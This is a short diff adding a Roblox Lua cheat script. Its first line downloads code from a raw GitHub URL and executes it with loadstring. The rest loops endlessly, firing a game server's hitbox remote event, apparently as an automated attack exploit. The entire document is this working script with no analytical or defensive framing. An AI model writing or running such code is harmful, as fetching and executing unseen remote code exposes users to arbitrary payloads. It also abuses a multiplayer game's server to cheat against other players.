@@ -1,0 +1,4 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/KhanhNgoc1/kfdhdf/refs/heads/main/blacklisted'))() 
+while wait() do
+   game:GetService("Players").LocalPlayer.PlayerGui.Guts.Skill1b.Z.TextButtonm1.Hitbox:FireServer(8,1)
+end
